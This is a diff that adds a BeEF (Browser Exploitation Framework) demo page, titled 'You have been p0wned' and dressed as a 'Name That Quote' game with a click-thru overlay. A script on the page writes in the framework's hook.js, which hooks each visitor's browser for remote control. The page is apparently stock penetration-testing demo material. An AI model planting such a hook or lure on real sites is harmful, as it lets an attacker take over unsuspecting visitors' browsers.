@@ -1,0 +1,182 @@
+<!--
+    Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+    Browser Exploitation Framework (BeEF) - http://beefproject.com
+    See the file 'doc/COPYING' for copying permission
+-->
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+	<title>You have been p0wned</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script src="http://cdn.jquerytools.org/1.2.7/all/jquery.tools.min.js"></script>
+
+<style type="text/css">
+body{
+margin:0;
+padding:0;
+color:#fff;
+font-family:'Neuton', georgia, serif;
+background-color:#999;
+}
+.quotes{
+width:100%;
+height:100%;
+text-align:center;
+margin:0 0 50px 0;
+padding-top:50px;
+}
+.quotes .inner{
+width:700px;
+margin:0 auto;
+}
+.inner h1{
+font-variant:small-caps;
+color:#333;
+font-size:30px;
+text-shadow:0 0 2px #2D58C4;
+width:361px;
+height:58px;
+margin:0 auto 30px;
+background-repeat:no-repeat;
+}
+.inner .text {
+line-height:48px;
+font-size:42px;
+}
+.inner .more-quotes{
+display:inline-block;
+width:200px;
+background:#09C;
+color:#fff;
+height:30px;
+line-height:30px;
+-webkit-border-radius:5px;
+-moz-border-radius:5px;
+border-radius5px;
+border:1p solid #999;
+text-decoration:none;
+margin-top:40px;
+}
+.inner .footnote{
+padding:5px 0;
+}
+.inner .footnote > a{
+/*
+display:inline-block;
+width:100px;
+background:#09C;
+color:#fff;
+height:30px;
+line-height:30px;
+-webkit-border-radius:5px;
+-moz-border-radius:5px;
+border-radius5px;
+border:1p solid #999;
+text-decoration:none;
+*/
+display:none;
+margin-top:5px;
+}
+.inner .footnote > span{
+/*display:none;*/
+}
+.click-thru{
+color:#333;
+display:none;
+width:400px;
+border:10px solid #666;
+border:10px solid rgba(82, 82, 82, 0.698);
+-moz-border-radius:8px;
+-webkit-border-radius:8px;
+z-index:10000;
+}
+.click-thru div{
+padding:10px;
+border:1px solid #3B5998;
+background-color:#fff;
+}
+.click-thru h2{
+margin:-11px;
+margin-bottom:0px;
+color:#fff;
+background-color:#6D84B4;
+padding:5px 10px;
+border:1px solid #3B5998;
+font-size:20px;
+}
+</style>
+</head>
+<body>
+<!-- BeEF hook call -->
+<script type="text/javascript">
+	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
+</script>
+
+
+<div class="wrapper">
+	<div class="quotes">
+		<div class="inner">
+			<h1>Name That Quote</h1>
+			<div class="text">You are a sad strange little man, and you have my pity.</div>
+			<div class="footnote">
+				<a href="javascript:void(0)">Who said it?</a>
+				<span>Buzz Lightyear, Toy Story</span>
+			</div>
+			<a href="javascript:void(0)" class="more-quotes">Another Quote</a>
+		</div>
+	</div>
+</div>
+
+<!-- BEGIN: Overlay on Page Load -->
+<div class="click-thru" id="overlay1">
+	<div>
+		<h2>Click-thru</h2>
+		<p>You must click here to get to the page.</p>
+		<a href="javascript:void(0)" class="close">Okay</a>
+		<a href="javascript:void(0)" style="display:inline-block;margin-left:10px;" class="close">No Thanks</a>
+	</div>
+</div>
+<!-- END: Overlay on Page Load -->
+
+<script type="text/javascript">
+$(document).ready(function(){
+$("body").width($(window).width()-10);
+$("body").height($(window).height()-70);
+
+var quotes = [];
+quotes[0] = {title: "Sometimes you gotta crack a few eggs to make an omelet.", footnote: "Charlie, It's Always Sunny In Philadelphia"};
+quotes[1] = {title: "Cats do not abide by the laws of nature.", footnote: "Charlie, It's Always Sunny In Philadelphia"};
+quotes[2] = {title: "We're gonna go America all over their asses!", footnote: "Charlie, It's Always Sunny In Philadelphia"};
+quotes[3] = {title: "You're about as much use as a condom machine in the Vatican.", footnote: "Rimmer, Red Dwarf"}
+quotes[4] = {title: "He may look like an idiot and talk like an idiot but don't let that fool you. He really is an idiot.", footnote: "Groucho Marx as Rufus T. Firefly, Duck Soup"}
+quotes[5] = {title: "You are a sad strange little man, and you have my pity.", footnote: "Buzz Lightyear, Toy Story"}
+$(".more-quotes").live("click", function(){
+	var random = Math.floor(Math.random()*(quotes.length));
+	$(".text").html(quotes[random].title);
+	$(".footnote > span").html(quotes[random].footnote).show();
+	$(".footnote > a").hide();
+});
+$(".footnote > a").live("click", function(){
+	$(this).hide();
+	$(".footnote > span").show()
+});
+
+// select the overlay element - and "make it an overlay"
+$("#overlay1").overlay({
+	top:200,
+	mask:{
+		color:'#000',
+		loadSpeed:200,
+		opacity:0.5
+	},
+	closeOnClick:false,
+	load:true
+});
+
+});
+</script>
+</body>
+</html>
